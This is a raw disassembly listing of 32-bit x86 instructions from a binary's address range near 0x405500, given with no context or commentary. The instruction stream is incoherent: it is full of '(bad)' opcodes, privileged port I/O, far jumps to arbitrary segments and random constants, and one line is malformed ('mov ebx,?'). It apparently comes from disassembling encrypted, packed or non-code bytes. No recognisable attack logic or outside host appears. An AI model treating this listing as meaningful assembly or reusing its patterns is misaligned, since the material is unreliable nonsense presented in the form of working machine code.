  4054d4:	cmp    cl,BYTE PTR [edx-0x797ead7b]
  4054da:	adc    ch,al
  4054dc:	les    ebp,FWORD PTR [edx+0x148bbcd7]
  4054e2:	js     0x4054e6
  4054e4:	cmp    BYTE PTR [eax-0xda6570c],dh
  4054ea:	in     eax,dx
  4054eb:	sub    BYTE PTR [edi],0xeb
  4054ee:	sahf   
  4054ef:	pop    edx
  4054f0:	and    al,0x4e
  4054f2:	xor    al,0xb4
  4054f4:	mov    bh,0x70
  4054f6:	pop    esp
  4054f7:	jmp    0x40547a
  4054f9:	cmp    eax,0x69d3fc2b
  4054fe:	pushf  
  4054ff:	fwait
  405500:	mov    ecx,0xebe607c5
  405505:	jge    0x405585
  405507:	pop    ebx
  405508:	add    al,ah
  40550a:	mov    ebx,0xe6926b2c
  40550f:	imul   esp,DWORD PTR [ecx],0xabec705
  405515:	dec    esi
  405516:	mov    bl,0x25
  405518:	mov    edi,0x4210dd86
  40551d:	dec    edi
  40551e:	mov    bh,0xa5
  405520:	test   eax,edi
  405522:	or     BYTE PTR [esp+ebp*1-0xf5cc35b],cl
  405529:	mov    dh,0x19
  40552b:	and    ebx,DWORD PTR [edx-0x5657f47d]
  405531:	dec    esi
  405532:	scas   eax,DWORD PTR es:[edi]
  405533:	jecxz  0x4054f6
  405535:	push   0x31
  405537:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405538:	push   cs
  405539:	push   ds
  40553a:	dec    esp
  40553b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40553c:	les    edi,FWORD PTR [esi+0x69c3cbd1]
  405542:	sub    dh,bh
  405544:	push   ds
  405545:	sbb    ah,BYTE PTR [ebp+0x4e]
  405548:	cld    
  405549:	adc    DWORD PTR [ecx+0x36],0x53b2b4bb
  405550:	call   0xc86:0x57882628
  405557:	dec    esi
  405558:	mul    DWORD PTR [ebx]
  40555a:	cmp    BYTE PTR [edi+0x17adbc20],ah
  405560:	(bad)  
  405561:	cmp    eax,0x34d5bec6
  405566:	cdq    
  405567:	lds    ecx,FWORD PTR ds:[ebp+0x5b0964c3]
  40556e:	retf   
  40556f:	dec    edi
  405570:	out    0x9c,al
  405572:	xor    dl,al
  405574:	and    eax,edi
  405576:	fs and al,0xf4
  405579:	dec    esi
  40557a:	add    al,0xa3
  40557c:	bound  esp,QWORD PTR cs:[esi-0x20]
  405580:	push   edi
  405581:	inc    esp
  405582:	stos   BYTE PTR es:[edi],al
  405583:	lods   eax,DWORD PTR ds:[esi]
  405584:	ror    esi,0xd0
  405587:	cli    
  405588:	cs pop ebx
  40558a:	pop    edi
  40558b:	pushf  
  40558c:	add    BYTE PTR [ebx-0x69a6bda],dl
  405592:	mov    esi,0xca30878e
  405597:	repnz lock iret 
  40559a:	or     BYTE PTR [edx-0x71f338bf],dl
  4055a0:	cmc    
  4055a1:	cmp    BYTE PTR [edi+esi*2],cl
  4055a4:	adc    BYTE PTR es:[esp+edx*1],ah
  4055a8:	xchg   BYTE PTR [ecx-0x4c4ca571],bh
  4055ae:	cmp    al,0xdd
  4055b0:	mov    al,ds:0xde61a809
  4055b5:	mov    dh,0xc8
  4055b7:	xor    esp,DWORD PTR [ebp-0x5f]
  4055ba:	(bad)  
  4055bb:	mov    ebx,0x890c77d7
  4055c0:	dec    ebx
  4055c1:	jmp    0x405549
  4055c3:	sbb    al,0xa5
  4055c5:	cli    
  4055c6:	hlt    
  4055c7:	ins    BYTE PTR es:[edi],dx
  4055c8:	outs   dx,BYTE PTR ds:[esi]
  4055c9:	jns    0x405561
  4055cb:	pop    es
  4055cc:	loope  0x40560d
  4055ce:	jnp    0x405608
  4055d0:	inc    ebx
  4055d1:	mov    ah,0xbb
  4055d3:	outs   dx,DWORD PTR ds:[esi]
  4055d4:	jns    0x40558a
  4055d6:	add    BYTE PTR [ebp+0x3c],ah
  4055d9:	test   eax,0x48d906ac
  4055de:	arpl   WORD PTR [ebx-0xe],si
  4055e1:	or     ch,BYTE PTR [edi]
  4055e3:	push   ebp
  4055e4:	dec    ebx
  4055e5:	sub    al,0x42
  4055e7:	inc    edx
  4055e8:	mov    esi,0xfe1e3fcf
  4055ed:	jle    0x4055ef
  4055ef:	and    ch,BYTE PTR [edi+eiz*1]
  4055f2:	lea    ebx,[edi]
  4055f4:	or     ebx,edi
  4055f6:	sar    DWORD PTR [eax+esi*1-0x54e41b6f],1
  4055fd:	retf   0xa72
  405600:	pop    edx
  405601:	sbb    ch,dl
  405603:	mov    ch,BYTE PTR [ecx]
  405605:	gs stos BYTE PTR es:[edi],al
  405607:	ss je  0x4055e8
  40560a:	js     0x405605
  40560c:	aas    
  40560d:	adc    DWORD PTR [edi],ebx
  40560f:	mov    WORD PTR [ebp-0x10966b14],es
  405615:	xor    DWORD PTR [edi+edi*2],ebp
  405618:	(bad)  
  405619:	nop
  40561a:	push   ss
  40561b:	mov    BYTE PTR [ecx-0x69d37d16],dl
  405621:	cmovb  edx,DWORD PTR [ebx]
  405624:	mov    dl,0xef
  405626:	xchg   ecx,eax
  405627:	ins    DWORD PTR es:[edi],dx
  405628:	xor    bl,BYTE PTR [esi-0x66]
  40562b:	vpsubsw ymm2,ymm5,YMMWORD PTR [esi-0x19]
  405630:	(bad)  
  405631:	outs   dx,DWORD PTR ds:[esi]
  405632:	mov    al,0xfd
  405634:	ja     0x4055c7
  405636:	xor    edi,DWORD PTR [eax]
  405638:	pop    ecx
  405639:	pop    esp
  40563a:	pop    esp
  40563b:	cmp    eax,0xb3d5cc4c
  405640:	out    dx,al
  405641:	stos   DWORD PTR es:[edi],eax
  405642:	push   0xffffffa0
  405644:	push   edi
  405645:	dec    BYTE PTR [esi+esi*2]
  405648:	js     0x40561e
  40564a:	dec    ecx
  40564b:	add    esi,DWORD PTR [esi-0x1885152d]
  405651:	and    eax,0x53beaa10
  405656:	mov    dl,0xc3
  405658:	adc    eax,0xb1f5f68a
  40565d:	pop    ecx
  40565e:	fcmovbe st,st(5)
  405660:	std    
  405661:	jno    0x40569e
  405663:	sbb    DWORD PTR [eax+0x5c],ebp
  405666:	xor    BYTE PTR ds:0x3ba26537,0xa9
  40566d:	call   0xc9f6:0x100d5f5c
  405674:	pop    edi
  405675:	arpl   WORD PTR [edx+0x2d],bx
  405678:	sbb    DWORD PTR [edx+0x16],eax
  40567b:	(bad)  
  40567c:	ins    BYTE PTR es:[edi],dx
  40567d:	lock push ebp
  40567f:	out    dx,eax
  405680:	mov    cl,0xcd
  405682:	mov    al,0xb2
  405684:	add    al,0x99
  405686:	retf   0x70b
  405689:	mov    ds:0xc991edc3,eax
  40568e:	mov    dh,0xc1
  405690:	rcr    DWORD PTR [ebx-0x4294a9b0],0x18
  405697:	lea    edx,[ebx]
  405699:	mov    esi,0xbcb76d9f
  40569e:	sub    esi,ebx
  4056a0:	jbe    0x405663
  4056a2:	sar    edi,1
  4056a4:	jp     0x405701
  4056a6:	adc    eax,0x82ba89c1
  4056ab:	xchg   ebx,ebp
  4056ad:	dec    ebp
  4056ae:	in     eax,dx
  4056af:	push   ebx
  4056b0:	jecxz  0x4056a9
  4056b2:	mov    edx,DWORD PTR [ebp+0x25c4e9e5]
  4056b8:	popa   
  4056b9:	inc    esp
  4056ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056bb:	xchg   BYTE PTR [ebp-0x7019fc08],ah
  4056c1:	sbb    al,0x9c
  4056c3:	jmp    0xdfeb:0xeba87a88
  4056ca:	dec    esp
  4056cb:	xor    al,BYTE PTR [esi-0x14]
  4056ce:	rol    DWORD PTR [ebp+edi*4+0x76],0xab
  4056d3:	scas   eax,DWORD PTR es:[edi]
  4056d4:	push   0x547962f8
  4056d9:	cld    
  4056da:	pop    edi
  4056db:	pop    eax
  4056dc:	fcom   st(1)
  4056de:	iret   
  4056df:	sbb    edx,DWORD PTR ds:0xa39e4b16
  4056e5:	xchg   BYTE PTR [edx-0x73a2e3ea],bh
  4056eb:	sahf   
  4056ec:	jmp    0x396050eb
  4056f1:	f2xm1  
  4056f3:	push   es
  4056f4:	and    BYTE PTR [ecx-0x7656cfc1],al
  4056fa:	(bad)  
  4056fb:	jp     0xbb884479
  405701:	mov    esp,0x7bb8569a
  405706:	dec    ebp
  405707:	out    0xbc,eax
  405709:	loopne 0x4056ee
  40570b:	js     0x40571a
  40570d:	mov    bl,0x4c
  40570f:	xchg   ebp,eax
  405710:	mov    esi,0xb29dd87f
  405715:	inc    esp
  405716:	cmc    
  405717:	mov    bl,0xa2
  405719:	shr    BYTE PTR [eax+0x70],1
  40571c:	lods   eax,DWORD PTR ds:[esi]
  40571d:	xor    BYTE PTR [ebx+0x1b],0x1b
  405721:	pusha  
  405722:	jbe    0x405781
  405724:	inc    edi
  405725:	pop    ecx
  405726:	and    eax,0xd8bb5bfb
  40572b:	je     0x4057a0
  40572d:	sub    ecx,eax
  40572f:	add    DWORD PTR [edx],0xf06198f0
  405735:	jle    0x4056c9
  405737:	mov    dh,dh
  405739:	jecxz  0x40578d
  40573b:	sub    eax,0x3f847e68
  405740:	lods   al,BYTE PTR ds:[esi]
  405741:	inc    ecx
  405742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405743:	xchg   ebp,eax
  405744:	retf   
  405745:	jnp    0x405779
  405747:	push   esi
  405748:	mov    al,0x11
  40574a:	sbb    BYTE PTR [ebx+0x51],0xf
  40574e:	scas   eax,DWORD PTR es:[edi]
  40574f:	pop    ecx
  405750:	xor    eax,0x419669a4
  405755:	pushf  
  405756:	mov    BYTE PTR [ecx+edx*8-0x57f48ccd],al
  40575d:	scas   al,BYTE PTR es:[edi]
  40575e:	jbe    0x40577e
  405760:	xchg   esi,eax
  405761:	dec    eax
  405762:	mov    ebx,?
  405764:	nop
  405765:	lahf   
  405766:	mov    eax,ds:0x230412ba
  40576b:	cmp    ebp,ecx
  40576d:	mov    esi,0x954bdf77
  405772:	xchg   esp,eax
  405773:	mov    edi,0x47f014ae
  405778:	push   ds
  405779:	fs enter 0x7051,0xf8
  40577e:	or     edi,eax
  405780:	inc    eax
  405781:	mov    ebp,esi
  405783:	cmp    BYTE PTR [esi],al
  405785:	xchg   ebp,eax
  405786:	inc    ecx
  405787:	mov    ch,0xcf
  405789:	jb     0x405743
  40578b:	imul   eax,ecx,0x8
  40578e:	mov    ss,WORD PTR [ebx-0x47d94e80]
  405794:	xor    edx,0x3a
  405797:	jecxz  0x40574b
  405799:	add    BYTE PTR [edi-0x47da10f6],0x54
  4057a0:	fwait
  4057a1:	test   eax,ebp
  4057a3:	repnz inc ebp
  4057a5:	ss jno 0x405811
  4057a8:	cdq    
  4057a9:	cdq    
  4057aa:	jecxz  0x4057f4
  4057ac:	ret    0x1034
  4057af:	push   edx
  4057b0:	xor    BYTE PTR [esi-0x33887e70],bl
  4057b6:	xlat   BYTE PTR ds:[ebx]
  4057b8:	in     al,dx
  4057b9:	loop   0x405808
  4057bb:	test   eax,0x2d4b098f
  4057c0:	aaa    
  4057c1:	sbb    ecx,DWORD PTR [ebx+0x6001b7bb]
  4057c7:	(bad)  
  4057c9:	popf   
  4057ca:	dec    ecx
  4057cb:	in     eax,dx
  4057cc:	adc    eax,0x68d9b6d3
  4057d1:	or     edi,ebx
  4057d3:	fsub   st,st(6)
  4057d5:	pop    es
  4057d6:	sbb    BYTE PTR [eax+0x4e],cl
  4057d9:	fwait
  4057da:	in     al,dx
  4057db:	xchg   ecx,eax
  4057dc:	jg     0x40576e
  4057de:	push   edx
  4057df:	stos   DWORD PTR es:[edi],eax
  4057e0:	stos   BYTE PTR es:[edi],al
  4057e1:	mov    ebx,0xfbc523e5
  4057e6:	sub    dh,BYTE PTR [esi+0x23]
  4057e9:	jle    0x4057d8
  4057eb:	aaa    
  4057ec:	sbb    ebp,DWORD PTR [ebx]
  4057ee:	sbb    dh,ch
  4057f0:	dec    ebp
  4057f1:	xchg   BYTE PTR [ecx-0x429d9b71],bl
  4057f7:	(bad)  
  4057f8:	sub    eax,0xcfb08546
  4057fd:	add    al,0x4f
  4057ff:	fsubr  DWORD PTR [eax-0x1e09f2d0]
  405805:	xor    esi,DWORD PTR [esi+0x704f994f]
  40580b:	dec    esi
  40580c:	lea    esi,[esi-0xc05e93c]
  405812:	fisubr DWORD PTR [ebx-0x45]
  405815:	clc    
  405816:	sub    bl,BYTE PTR [ecx]
  405818:	mov    edx,0x4d8a7726
  40581d:	jo     0x4057e1
  40581f:	popf   
  405820:	movzx  esp,sp
  405823:	dec    edi
  405824:	sbb    BYTE PTR [eax],dl
  405826:	cmp    DWORD PTR [ecx-0x7e],ecx
  405829:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40582a:	imul   esp,DWORD PTR [eax],0xffffff8c
  40582d:	loopne 0x405853
  40582f:	mov    al,0x2c
  405831:	pop    esp
  405832:	scas   eax,DWORD PTR es:[edi]
  405833:	iret   
  405834:	xchg   edi,eax
  405835:	sbb    ecx,esi
  405837:	outs   dx,DWORD PTR ds:[esi]
  405838:	ja     0x405883
  40583a:	inc    eax
  40583b:	dec    eax
  40583c:	ret    
  40583d:	push   ss
  40583e:	jae    0x405897
  405840:	data16 rol BYTE PTR [esi-0xac8e40b],1
  405847:	xor    BYTE PTR [ebx],bl
  405849:	ja     0x4057fc
  40584b:	push   es
  40584c:	das    
  40584d:	sub    DWORD PTR [ebp+0x9],esi
  405850:	leave  
  405851:	push   ecx
  405852:	pusha  
  405853:	inc    esp
  405854:	xor    dh,bl
  405856:	cwde   
  405857:	inc    esp
  405858:	retf   
  405859:	lds    edi,FWORD PTR [ebx-0x3d]
  40585c:	or     al,bl
  40585e:	lahf   
  40585f:	or     BYTE PTR [eax+eiz*8-0x41ca522b],cl
  405866:	out    dx,eax
  405867:	ss and al,0x32
  40586a:	frstor [ecx-0x1a96611e]
  405870:	and    DWORD PTR [edi+0x50128974],ebx
  405876:	cld    
  405877:	loope  0x4058f7
  405879:	int    0xd2
  40587b:	push   eax
  40587c:	jae    0x40585a
  40587e:	pop    ebp
  40587f:	add    BYTE PTR [edi],0xd
  405882:	outs   dx,DWORD PTR ds:[esi]
  405883:	test   BYTE PTR [esi+edi*8-0x3df2673e],dl
  40588a:	and    DWORD PTR [ebx-0x66],ebx
  40588d:	and    al,0xef
  40588f:	push   eax
  405890:	xchg   esi,eax
  405891:	std    
  405892:	ss jge 0x4058c8
  405895:	enter  0xf589,0xb9
  405899:	adc    BYTE PTR [ebp-0x27],ah
  40589c:	mov    esi,0x7f0cd6a0
  4058a1:	mov    eax,ds:0xfb68ca1f
  4058a6:	loop   0x40590a
  4058a8:	add    DWORD PTR [eax],edx
  4058aa:	dec    esp
  4058ab:	xor    ebx,edi
  4058ad:	cmp    al,0x3a
  4058af:	aaa    
  4058b0:	lahf   
  4058b1:	ret    
  4058b2:	mov    ds:0x304bfad7,eax
  4058b7:	dec    edx
  4058b8:	das    
  4058b9:	sbb    eax,0x61524f95
  4058be:	dec    ecx
  4058bf:	and    al,BYTE PTR [ecx+0x69]
  4058c2:	dec    ebp
  4058c3:	mov    bl,0x30
  4058c5:	sbb    eax,DWORD PTR [ebp-0x74]
  4058c8:	cs mov esp,0xa969a466
  4058ce:	sbb    edi,edx
  4058d0:	pop    esi
  4058d1:	pop    edi
  4058d2:	clc    
  4058d3:	inc    ecx
  4058d4:	retf   
  4058d5:	mov    ecx,0x1fcbecc5
  4058da:	std    
  4058db:	or     eax,0x6dcd4f44
  4058e0:	push   esp
  4058e1:	xchg   ecx,eax
  4058e2:	mov    BYTE PTR [eax-0x3caa8ebf],bh
  4058e8:	jge    0x405927
  4058ea:	retf   0xf2ca
  4058ed:	je     0x405962
  4058ef:	jnp    0x405940
  4058f1:	mov    eax,0x7ad1c402
  4058f6:	mov    bl,0xa2
  4058f8:	mov    ah,0x83
  4058fa:	push   0xee2697f3
  4058ff:	retf   
  405900:	jne    0x4058ba
  405902:	cmp    ebx,0xddf5e828
  405908:	cmp    DWORD PTR [edx],edi
  40590a:	fstp   QWORD PTR [edi-0x1731cec8]
  405910:	push   edx
  405911:	add    dl,ah
  405913:	inc    ecx
  405914:	cwde   
  405915:	es xchg ebx,eax
  405917:	xor    ch,BYTE PTR [edx+0x3b1e0f54]
  40591d:	mov    ecx,0x473401d3
  405922:	fiadd  WORD PTR es:[ebp+0x662bf5a0]
  405929:	hlt    
  40592a:	mov    WORD PTR [esi],ss
  40592c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40592d:	sbb    bl,BYTE PTR [ecx+0x69]
  405930:	cld    
  405931:	sub    bh,BYTE PTR [ebp-0x3d01424d]
  405937:	cmp    ah,BYTE PTR ss:[esp+eax*4+0x7b6c383c]
  40593f:	hlt    
  405940:	adc    cl,dl
  405942:	push   ebp
  405943:	in     al,dx
  405944:	popf   
  405945:	(bad)  
  405946:	sub    bl,bh
  405948:	scas   al,BYTE PTR es:[edi]
  405949:	push   cs
  40594a:	leave  
  40594b:	stos   DWORD PTR es:[edi],eax
  40594c:	aam    0xf9
  40594e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40594f:	pusha  
  405950:	ds add al,0x3d
  405953:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405954:	retf   
  405955:	pop    ebx
  405956:	addr16 das 
  405958:	sbb    cl,BYTE PTR [edx+0x3ee0797d]
  40595e:	aam    0x38
  405960:	scas   al,BYTE PTR es:[edi]
  405961:	mov    edi,0x17c8080
  405966:	js     0x40597b
  405968:	push   edi
  405969:	test   BYTE PTR [eax-0x3033aee3],ch
  40596f:	mov    ah,0x1d
  405971:	cli    
  405972:	es pop edx
  405974:	xchg   esp,eax
  405975:	arpl   bp,sp
  405977:	xor    ebx,DWORD PTR [esp+eax*8-0x8]
  40597b:	dec    edx
  40597c:	aaa    
  40597d:	and    al,0xd7
  40597f:	push   edi
  405980:	cmc    
  405981:	loope  0x40597d
  405983:	in     al,dx
  405984:	and    bh,ah
  405986:	jae    0x4059db
  405988:	or     DWORD PTR [esi-0x5],edx
  40598b:	mov    cl,0xea
  40598d:	sbb    cl,BYTE PTR [ecx]
  40598f:	test   eax,0x302abaa2
  405994:	or     DWORD PTR [edx+0x7d9264d],ebx
  40599a:	(bad)  
  40599b:	lea    esp,ds:0xc7ec
  4059a0:	xor    al,0x8a
  4059a2:	mov    fs,WORD PTR [ebp+0x56]
  4059a5:	cmp    cl,BYTE PTR [esi]
  4059a7:	push   ebx
  4059a8:	xchg   DWORD PTR [ecx-0x28],ebp
  4059ab:	xor    al,0x14
  4059ad:	in     eax,dx
  4059ae:	pop    esp
  4059af:	mov    ebp,0x594a3a4
  4059b4:	and    cl,0x79
  4059b7:	enter  0x4b6b,0x4
  4059bb:	into   
  4059bc:	retf   
  4059bd:	push   ebx
  4059be:	into   
  4059bf:	test   al,0x92
  4059c1:	pop    es
  4059c2:	mov    BYTE PTR [edi-0x50],bh
  4059c5:	dec    ecx
  4059c6:	call   0x5b3c8014
  4059cb:	inc    esi
  4059cc:	push   cs
  4059cd:	repnz popf 
  4059cf:	std    
  4059d0:	sub    BYTE PTR [ecx],bl
  4059d2:	adc    cl,bl
  4059d4:	hlt    
  4059d5:	pusha  
  4059d6:	and    al,0x2f
  4059d8:	xor    eax,DWORD PTR [edi+0x51]
  4059db:	push   esp
  4059dc:	int3   
  4059dd:	mov    dh,0x81
  4059df:	retf   0xeae1
  4059e2:	shl    BYTE PTR [eax+0x173cb4f3],0x58
  4059e9:	hlt    
  4059ea:	mov    ds:0xb02478f,eax
  4059ef:	or     ecx,DWORD PTR [esi+0x4b]
  4059f2:	rcr    BYTE PTR [edx],1
  4059f4:	mov    dh,0x67
  4059f6:	xor    edx,DWORD PTR [si]
  4059f9:	jg     0x40598d
  4059fb:	out    0xe4,eax
  4059fd:	aas    
  4059fe:	push   esp
  4059ff:	test   DWORD PTR [edi-0x57aa2144],edi
  405a05:	inc    edx
  405a06:	pop    ss
  405a07:	ins    DWORD PTR es:[edi],dx
  405a08:	pop    edi
  405a09:	push   ebp
  405a0a:	(bad)  
  405a0b:	imul   esp,DWORD PTR [eax],0x4f
  405a0e:	sti    
  405a0f:	jb     0x405a37
  405a11:	mov    ebx,0x20aee9b7
  405a16:	mov    ebp,edx
  405a18:	pushf  
  405a19:	in     eax,dx
  405a1a:	dec    edx
  405a1b:	or     ecx,DWORD PTR [edx-0x40fd3124]
  405a21:	mov    ebp,0x7a16d80c
  405a26:	or     BYTE PTR [edi-0x26ff3ba0],bl
  405a2c:	adc    BYTE PTR [edx],bl
  405a2e:	adc    ecx,DWORD PTR [esp+eiz*2]
  405a31:	cld    
  405a32:	cs scas al,BYTE PTR es:[edi]
  405a34:	xchg   edi,eax
  405a35:	mov    dh,0x64
  405a37:	stos   DWORD PTR es:[edi],eax
  405a38:	les    esp,FWORD PTR [ebp-0x6d236fd7]
  405a3e:	(bad)  [edi+0x75f879bd]
  405a44:	imul   esi,esi,0x14
  405a47:	push   esi
  405a48:	cmp    esi,DWORD PTR [edx]
  405a4a:	push   ss
  405a4b:	nop
  405a4c:	sub    eax,0x10dbe5a7
  405a51:	mov    eax,0xbfe43a68
  405a56:	push   edx
  405a57:	dec    esp
  405a58:	inc    ebp
  405a59:	test   al,0xf5
  405a5b:	fidivr DWORD PTR [ebx-0x6df2ea1f]
  405a61:	dec    esi
  405a62:	push   0xffffffe5
  405a64:	pop    ss
  405a65:	dec    esp
  405a66:	mov    edi,DWORD PTR [edi+ebx*1]
  405a69:	out    0xcd,eax
  405a6b:	mov    dh,0x2d
  405a6d:	fwait
  405a6e:	and    al,0xc5
  405a70:	out    0xe7,al
  405a72:	pop    ecx
  405a73:	xor    eax,0x969bb8c8
  405a78:	cld    
  405a79:	jmp    0x8930421a
  405a7e:	call   FWORD PTR [edi+0x55]
  405a81:	adc    al,0x65
  405a83:	fs popa 
  405a85:	(bad)  
  405a87:	cwde   
  405a88:	dec    esp
  405a89:	xor    al,BYTE PTR [ebp+0x5420aaaf]
  405a8f:	jns    0x405a7f
  405a91:	ret    
  405a92:	dec    edx
  405a93:	jae    0x405a1d
  405a95:	and    al,0x1d
  405a97:	cmp    BYTE PTR [ebp-0x2b],bh
  405a9a:	popf   
  405a9b:	sub    al,0xb2
  405a9d:	jno    0x405a9a
  405a9f:	int    0x4c
  405aa1:	shr    DWORD PTR [ecx],cl
  405aa3:	mov    ss,WORD PTR [ecx]
  405aa5:	pop    edx
  405aa6:	xor    DWORD PTR [edi+0x5c],edi
  405aa9:	gs jl  0x405af8
  405aac:	or     BYTE PTR [esi+0x4c],al
  405aaf:	dec    ebx
  405ab0:	cmp    ebp,DWORD PTR [ebp-0x62]
  405ab3:	loopne 0x405b27
  405ab5:	lods   al,BYTE PTR ds:[esi]
  405ab6:	mov    ds:0x17df3a47,al
  405abb:	sbb    cl,BYTE PTR [edx-0x4e163a12]
  405ac1:	mov    ch,0xe0
  405ac3:	xor    BYTE PTR [edi],ah
  405ac5:	mov    eax,ds:0x4db6fb86
  405aca:	sub    ecx,DWORD PTR [eax-0x5e]
  405acd:	sbb    DWORD PTR [ecx+0x6ced396d],ecx
  405ad3:	xor    BYTE PTR [ebp-0x37b333b3],al
  405ad9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ada:	scas   al,BYTE PTR es:[edi]
  405adb:	cmp    DWORD PTR [esi+0x6b],edi
  405ade:	ret    
  405adf:	ja     0x405ad1
  405ae1:	xchg   ebx,eax
  405ae2:	fwait
  405ae3:	mov    ebx,ebp
  405ae5:	mov    eax,0x66a33b1a
  405aea:	mov    al,0x7a
  405aec:	xor    ecx,DWORD PTR fs:[ebx-0x7d]
  405af0:	ret    
  405af1:	fwait
  405af2:	sub    BYTE PTR [ebx-0x2291b166],ch
  405af8:	sti    
  405af9:	xchg   BYTE PTR [eax+0x29],bl
  405afc:	and    DWORD PTR [esi-0x2a],ecx
  405aff:	ds jb  0x405b02
  405b02:	js     0x405b60
  405b04:	in     eax,0x4
  405b06:	hlt    
  405b07:	inc    ebx
  405b08:	scas   eax,DWORD PTR es:[edi]
  405b09:	push   ebp
  405b0a:	je     0x405adf
  405b0c:	into   
  405b0d:	cmp    ebp,DWORD PTR [ebx]
  405b0f:	fistp  QWORD PTR [ecx-0x2363c8b9]
  405b15:	push   cs
  405b16:	adc    DWORD PTR [ebp-0x727e31d5],ebp
  405b1c:	loopne 0x405b48
  405b1e:	jmp    0x73b9:0x69e7c961
  405b25:	shl    edi,1
  405b27:	cld    
  405b28:	iret   
  405b29:	jb     0x405b26
  405b2b:	popf   
  405b2c:	xor    esi,ecx
  405b2e:	sahf   
  405b2f:	or     ch,dl
  405b31:	mov    BYTE PTR [ecx],bh
  405b33:	push   0x11
  405b35:	mov    DWORD PTR ds:0xe5489a3a,esp
  405b3b:	std    
  405b3c:	scas   al,BYTE PTR es:[edi]
  405b3d:	mov    bl,0x23
  405b3f:	jns    0x405b2d
  405b41:	jns    0x405b6a
  405b43:	sbb    BYTE PTR [eax-0x8],ch
  405b46:	imul   esp,DWORD PTR [ecx+eiz*2-0x7b],0x93648dff
  405b4e:	(bad)  
  405b4f:	dec    ebp
  405b50:	rol    BYTE PTR [esi],cl
  405b52:	jmp    0xf4feb704
  405b57:	sub    al,0x3c
  405b59:	les    ebp,FWORD PTR [esi]
  405b5b:	nop
  405b5c:	cld    
  405b5d:	sahf   
  405b5e:	stos   DWORD PTR es:[edi],eax
  405b5f:	cmp    edi,DWORD PTR [edi-0x23]
  405b62:	hlt    
  405b63:	cmp    BYTE PTR [ebx+eax*1+0xd715c2a],ch
  405b6a:	mov    ds:0x2528b148,al
  405b6f:	mov    eax,0xa653cc8f
  405b74:	and    DWORD PTR [eax-0x45],ecx
  405b77:	(bad)  
  405b78:	jmp    0x405b34
  405b7a:	addr16 pop ebp
  405b7c:	shl    DWORD PTR [ebp+0x6d],cl
  405b7f:	std    
  405b80:	ins    BYTE PTR es:[edi],dx
  405b81:	fmul   st(3),st
  405b83:	imul   eax,DWORD PTR [ecx],0x4eb0e20b
  405b89:	or     WORD PTR [ecx+0x3f],si
  405b8d:	icebp  
  405b8e:	adc    al,BYTE PTR [edx+0x1c]
  405b91:	adc    BYTE PTR [ecx-0x350862db],ah
  405b97:	test   al,0x64
  405b99:	pushf  
  405b9a:	push   edi
  405b9b:	and    al,0xf2
  405b9d:	jo     0x405b40
  405b9f:	test   al,0x53
  405ba1:	fisttp WORD PTR [edi-0x28df4a05]
  405ba7:	adc    esp,DWORD PTR [ebp+0x18]
  405baa:	shr    BYTE PTR [esi+0x3f366eb0],1
  405bb0:	push   ss
  405bb1:	xlat   BYTE PTR ds:[ebx]
  405bb2:	fneni(8087 only) 
  405bb4:	aaa    
  405bb5:	aad    0x37
  405bb7:	into   
  405bb8:	lods   al,BYTE PTR ds:[esi]
  405bb9:	jmp    0x4fb45cec
  405bbe:	or     al,0xc2
  405bc0:	mov    DWORD PTR [esi+0x3725e75b],esi
  405bc6:	adc    bl,BYTE PTR [edx+0x53]
  405bc9:	iret   
  405bca:	and    eax,0x47745235
  405bcf:	mov    dl,0x6a
  405bd1:	(bad)  
  405bd2:	nop
  405bd3:	loope  0x405b75
  405bd5:	add    al,0x9b
  405bd7:	test   BYTE PTR [esi+0x49],bh
  405bda:	xor    ch,0x87
  405bdd:	les    edi,FWORD PTR [eax-0xa892ea3]
  405be3:	add    ebx,DWORD PTR [esi+ebp*1-0x1496588c]
  405bea:	inc    ebp
  405beb:	push   esp
  405bec:	ins    DWORD PTR es:[edi],dx
  405bed:	add    BYTE PTR [esi+0x19],bl
  405bf0:	and    al,0x4c
  405bf2:	and    al,0xc8
  405bf4:	xchg   edx,eax
  405bf5:	ret    0x8391
  405bf8:	jl     0x405bab
  405bfa:	xchg   esp,eax
  405bfb:	lods   al,BYTE PTR ds:[esi]
  405bfc:	jnp    0x405b8d
  405bfe:	push   esi
  405bff:	arpl   ax,sp
  405c01:	inc    edx
  405c02:	ror    al,0xde
  405c05:	xor    al,0x24
  405c07:	enter  0xcd7,0xe4
  405c0b:	push   es
  405c0c:	loope  0x405ba8
  405c0e:	xchg   BYTE PTR [esi+0x1e],dh
  405c11:	xchg   BYTE PTR [esi],dh
  405c13:	int3   
  405c14:	ja     0x405c7c
  405c16:	inc    edi
  405c17:	jp     0x405c5e
  405c19:	jecxz  0x405be6
  405c1b:	shr    DWORD PTR [eax+0x13278640],1
  405c21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c22:	pusha  
  405c23:	xchg   esp,eax
  405c24:	xlat   BYTE PTR ds:[ebx]
  405c25:	or     BYTE PTR [ebp-0x5ce2b2b5],cl
  405c2b:	pop    eax
  405c2c:	and    DWORD PTR [edx+ecx*1-0x21],esi
  405c30:	push   edi
  405c31:	(bad)  
  405c32:	loopne 0x405c0b
  405c34:	cli    
  405c35:	lea    eax,[eax-0x23]
  405c38:	iret   
  405c39:	std    
  405c3a:	enter  0x58d5,0x3a
  405c3e:	push   esp
  405c3f:	cmp    ebx,DWORD PTR [edx-0x4e]
  405c42:	lock pop ecx
  405c44:	lods   al,BYTE PTR ds:[esi]
  405c45:	jle    0x405bd6
  405c47:	mov    DWORD PTR [edi+0x62fecd05],esi
  405c4d:	push   esi
  405c4e:	xchg   ebp,eax
  405c4f:	pop    ds
  405c50:	mov    bl,0x14
  405c52:	fistp  QWORD PTR [ebp+0x72]
  405c55:	add    BYTE PTR [edx-0x69a94005],0x5e
  405c5c:	sahf   
  405c5d:	test   ecx,eax
  405c5f:	dec    ebx
  405c60:	dec    esi
  405c61:	mov    al,0xeb
  405c63:	add    BYTE PTR [ebp-0x47],ah
  405c66:	fcmovne st,st(6)
  405c68:	inc    edi
  405c69:	fcmovne st,st(5)
  405c6b:	out    0xc0,eax
